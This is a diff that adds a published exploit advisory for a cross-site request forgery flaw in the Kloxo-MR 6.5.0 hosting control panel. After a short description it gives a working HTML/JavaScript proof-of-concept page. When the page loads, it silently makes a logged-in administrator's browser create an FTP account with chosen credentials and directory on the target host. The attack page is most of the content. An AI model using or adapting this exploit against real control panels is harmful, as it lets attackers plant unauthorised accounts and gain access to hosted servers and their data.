@@ -1,0 +1,54 @@
+# Exploit Title		:Kloxo-MR 6.5.0 CSRF Vulnerability
+# Vendor Homepage	:https://github.com/mustafaramadhan/kloxo/tree/dev
+# Version	:Kloxo-MR 6.5.0.f-2014020301
+# Tested on			:Centos 6.4
+# Exploit Author	:Necmettin COSKUN =>@babayarisi
+# Blog				:http://www.ncoskun.com http://www.grisapka.org
+# Discovery date	:03/12/2014
+# CVE				:N/A
+ 
+Kloxo-MR is special edition (fork) of Kloxo with many features not existing on Kloxo official release (6.1.12+).
+This fork named as Kloxo-MR (meaning 'Kloxo fork by Mustafa Ramadhan').
+================
+CSRF Vulnerability
+ 
+Vulnerability
+================
+Kloxo-MR has lots of POST and GET based form applications like Kloxo stable , some inputs escaped from specialchars but inputs dont have any csrf protection or secret key 
+So an remote attacker can manipulate this forms to add/delete mysql user,create/delete subdomains or add/delete ftp accounts.
+
+Poc Exploit
+================
+
+ <html>
+ <head><title>Kloxo-MR demo</title></head>
+ <script type="text/javascript">
+ function yurudi(){
+		///////////////////////////////////////////////////////////
+		//Kloxo-MR 6.5.0  CSRF Vulnerability		 //	
+		//Author:Necmettin COSKUN => twitter.com/@babayarisi	 //
+		//Blog: http://www.ncoskun.com | http://www.grisapka.org //
+		///////////////////////////////////////////////////////////
+		//Remote host
+		var host="victim.com";	
+		//New Ftp Username
+		var username="demouser";
+		//New Ftp Password
+		var pass="12345678";
+		//This creates new folder under admin dir. /admin/yourfolder
+		var dir="demodirectory";
+		//If necessary only modify http to https ;)
+		var urlson="http://"+host+":7778//display.php?frm_o_cname=ftpuser&frm_dttype&frm_ftpuser_c_nname="+username+"&frm_ftpuser_c_complete_name_f=--direct--&frm_ftpuser_c_password="+pass+"&frm_confirm_password="+pass+"&frm_ftpuser_c_directory="+dir+"&frm_ftpuser_c_ftp_disk_usage&frm_action=add";
+
+		document.getElementById('demoexploit').src=urlson;
+}
+ </script>
+ <body onload="yurudi();">
+ <img id="demoexploit" src=""></img>
+ </body>
+ </html>
+ 
+ 
+Discovered by:
+================
+Necmettin COSKUN  |GrisapkaGuvenlikGrubu|4ewa2getha!
